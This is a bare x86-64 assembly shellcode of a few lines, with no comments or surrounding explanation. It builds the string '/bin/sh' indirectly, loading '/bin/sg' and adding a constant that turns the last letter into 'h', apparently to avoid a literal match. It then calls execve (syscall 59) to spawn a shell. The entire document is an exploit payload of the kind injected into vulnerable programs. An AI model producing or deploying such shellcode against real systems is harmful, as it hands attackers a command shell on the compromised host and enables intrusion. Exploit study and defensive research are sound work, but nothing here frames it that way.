global _start

section .text

_start:
    xor rsi, rsi
    xor rdx, rdx

    mov rax, 0x0067732f6e69622f
    mov rbx, 0x0001000000000000
    add rax, rbx
    push rax
    mov rax, 59
    mov rdi, rsp
    syscall
